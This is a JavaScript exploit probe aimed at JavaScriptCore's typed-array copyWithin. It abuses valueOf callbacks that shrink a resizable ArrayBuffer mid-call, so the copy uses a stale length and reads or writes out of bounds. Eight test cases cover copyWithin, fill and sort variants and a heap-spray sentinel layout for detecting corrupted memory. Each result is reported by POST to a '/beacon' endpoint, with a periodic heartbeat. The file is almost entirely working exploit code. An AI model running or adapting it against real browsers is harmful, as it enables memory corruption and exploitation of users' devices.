/*
 * p415 -- RAB copyWithin TOCTOU via valueOf callback
 * Target: JSGenericTypedArrayViewPrototypeFunctions.h genericTypedArrayViewProtoFuncCopyWithin
 * Bug: length captured before valueOf on 'from' argument, valueOf resizes buffer,
 *      memmove uses stale length -> OOB read/write
 * Beacon prefix: V415-
 */
(function(){
"use strict";
var RUN = "v415-" + Math.random().toString(36).slice(2,10);

function beacon(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V415-" + tag, false);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({ r: RUN, b: typeof data === "string" ? data : JSON.stringify(data) }));
  } catch(e) {}
}

function tryCall(fn) {
  try { return { v: fn(), e: null }; }
  catch(ex) { return { v: null, e: ex.constructor.name + ":" + String(ex.message).slice(0,200) }; }
}

beacon("L", "probe415-start");

// T1: Basic RAB + copyWithin capability check
function T1_baseline() {
  var result = {};
  var r1 = tryCall(function() {
    var ab = new ArrayBuffer(256, {maxByteLength: 1024});
    return ab.byteLength + ":" + ab.maxByteLength;
  });
  result.rabCreate = r1.e || r1.v;

  var r2 = tryCall(function() {
    var ab = new ArrayBuffer(256, {maxByteLength: 1024});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = i & 0xff;
    u8.copyWithin(128, 0, 64);
    return "copied:" + u8[128] + "," + u8[129] + "," + u8[191];
  });
  result.copyWithin = r2.e || r2.v;

  var r3 = tryCall(function() {
    var ab = new ArrayBuffer(256, {maxByteLength: 1024});
    var u8 = new Uint8Array(ab);
    ab.resize(64);
    return "resized:" + ab.byteLength + ":taLen=" + u8.length;
  });
  result.resize = r3.e || r3.v;

  beacon("T1-BASE", result);
}

// T2: THE BUG -- copyWithin with valueOf that resizes to 0
function T2_toctou_shrink() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);

    // Fill with marker pattern
    for (var i = 0; i < 0x1000; i++) u8[i] = 0xAA;

    var poison = {
      valueOf: function() {
        resizeCount++;
        ab.resize(0);
        return 0;
      }
    };

    // copyWithin(target=0x20, from=poison_valueOf, end=undefined)
    // On unpatched: length=0x1000 captured first, then poison.valueOf() shrinks to 0
    // memmove(ptr+0x20, ptr+0, min(0x1000-0x20, 0x1000-0)=0xFE0) on a 0-byte buffer
    u8.copyWithin(0x20, poison);

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e; // If no error, copyWithin proceeded with stale length

  beacon("T2-SHRINK0", result);
}

// T3: copyWithin with valueOf that shrinks to small (not 0)
function T3_toctou_partial_shrink() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 0x1000; i++) u8[i] = (i & 0xFF);

    var poison = {
      valueOf: function() {
        resizeCount++;
        ab.resize(32); // Shrink to 32 bytes
        return 0;       // from=0
      }
    };

    // target=0x100, from=poison(shrinks to 32, returns 0)
    // Stale length=0x1000, to=0x100, from=0
    // count = min(0x1000 - 0x100, 0x1000 - 0) = 0xF00
    // memmove(ptr+0x100, ptr+0, 0xF00) -- OOB on 32-byte buffer
    u8.copyWithin(0x100, poison);

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e;

  beacon("T3-SHRINK32", result);
}

// T4: copyWithin target via valueOf (target param is the FIRST arg, evaluated before from)
function T4_target_valueof() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 0x1000; i++) u8[i] = 0xBB;

    var poison = {
      valueOf: function() {
        resizeCount++;
        ab.resize(16);
        return 0x800; // target=0x800 (past shrunk buffer)
      }
    };

    // target=poison(shrinks to 16, returns 0x800), from=0
    u8.copyWithin(poison, 0);

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e;

  beacon("T4-TARGET", result);
}

// T5: copyWithin end param via valueOf
function T5_end_valueof() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 0x1000; i++) u8[i] = 0xCC;

    var poisonEnd = {
      valueOf: function() {
        resizeCount++;
        ab.resize(8);
        return 0x1000; // end=full stale length
      }
    };

    // target=0, from=0, end=poison(shrinks to 8, returns 0x1000)
    // count = min(0x1000 - 0, 0x1000 - 0) = 0x1000
    u8.copyWithin(0, 0, poisonEnd);

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e;

  beacon("T5-END", result);
}

// T6: fill() with valueOf (another candidate path)
function T6_fill_valueof() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);

    var poisonStart = {
      valueOf: function() {
        resizeCount++;
        ab.resize(16);
        return 0; // start=0
      }
    };

    // fill(value=0x41, start=poison(shrinks), end=undefined)
    u8.fill(0x41, poisonStart);

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e;

  beacon("T6-FILL", result);
}

// T7: sort() with comparator that resizes
function T7_sort_resize() {
  var result = {};
  var resizeCount = 0;

  var r = tryCall(function() {
    var ab = new ArrayBuffer(256, {maxByteLength: 1024});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 256; i++) u8[i] = 255 - i;

    u8.sort(function(a, b) {
      if (resizeCount === 0) {
        resizeCount++;
        ab.resize(16);
      }
      return a - b;
    });

    return "survived:rabLen=" + ab.byteLength + ":taLen=" + u8.length;
  });

  result.result = r.e || r.v;
  result.resizeCount = resizeCount;
  result.TOCTOU_OOB = !r.e;

  beacon("T7-SORT", result);
}

// T8: Heap spray before shrink to detect OOB read
function T8_oob_detect() {
  var result = {};

  var r = tryCall(function() {
    // Allocate sentinel buffers around target
    var sentinels = [];
    for (var s = 0; s < 100; s++) {
      var sb = new ArrayBuffer(0x1000);
      var sv = new Uint8Array(sb);
      for (var j = 0; j < 0x1000; j++) sv[j] = 0xDE;
      sentinels.push(sv);
    }

    var ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 0x1000; i++) u8[i] = 0xAA;

    // More sentinels after
    for (var s = 0; s < 100; s++) {
      var sb2 = new ArrayBuffer(0x1000);
      var sv2 = new Uint8Array(sb2);
      for (var j = 0; j < 0x1000; j++) sv2[j] = 0xBE;
      sentinels.push(sv2);
    }

    var poison = {
      valueOf: function() {
        ab.resize(32);
        return 0;
      }
    };

    // If this succeeds, copyWithin wrote past the 32-byte boundary
    u8.copyWithin(0, poison);

    // Read back -- after resize to 32, only 32 bytes should be accessible
    // Grow back to check what's past byte 32
    ab.resize(0x1000);
    var oobBytes = 0;
    var deBytes = 0;
    var beBytes = 0;
    var aaBytes = 0;
    for (var i = 32; i < 0x1000; i++) {
      if (u8[i] === 0xAA) aaBytes++;
      else if (u8[i] === 0xDE) deBytes++;
      else if (u8[i] === 0xBE) beBytes++;
      else if (u8[i] !== 0) oobBytes++;
    }

    return "aa=" + aaBytes + ":de=" + deBytes + ":be=" + beBytes + ":other=" + oobBytes;
  });

  result.result = r.e || r.v;
  // If aaBytes > 0, the copyWithin wrote 0xAA past the 32-byte shrunk boundary
  // That means the memmove used stale length (OOB)

  beacon("T8-DETECT", result);
}

// Schedule tests
var tests = [T1_baseline, T2_toctou_shrink, T3_toctou_partial_shrink,
             T4_target_valueof, T5_end_valueof, T6_fill_valueof,
             T7_sort_resize, T8_oob_detect];
var idx = 0;
function runNext() {
  if (idx >= tests.length) {
    beacon("Z", "probe415-done");
    return;
  }
  try { tests[idx](); } catch(e) { beacon("ERR", tests[idx].name + ":" + e.message.slice(0,200)); }
  idx++;
  setTimeout(runNext, 400);
}

setInterval(function() { beacon("HB", "hb"); }, 10000);
setTimeout(runNext, 200);

})();
